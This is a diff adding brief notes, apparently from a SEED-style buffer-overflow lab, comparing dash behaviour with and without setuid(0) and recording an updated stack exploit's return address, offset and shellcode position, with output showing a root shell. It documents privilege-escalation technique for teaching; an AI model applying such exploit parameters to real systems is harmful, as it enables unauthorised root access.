@@ -1,0 +1,17 @@
+Dash behavior without setuid(0):
+$ printf "id\nwhoami\nexit\n" | ./dash_shell_test_nosetuid
+uid=1000(seed) gid=1000(seed) groups=1000(seed)
+seed
+
+Dash behavior with setuid(0):
+$ printf "id\nwhoami\nexit\n" | ./dash_shell_test_setuid
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
+
+Updated exploit using setuid(0) shellcode:
+ret = 0x40800b6f
+offset = 28
+shellcode_start = 484
+$ printf "id\nwhoami\nexit\n" | ./stack
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
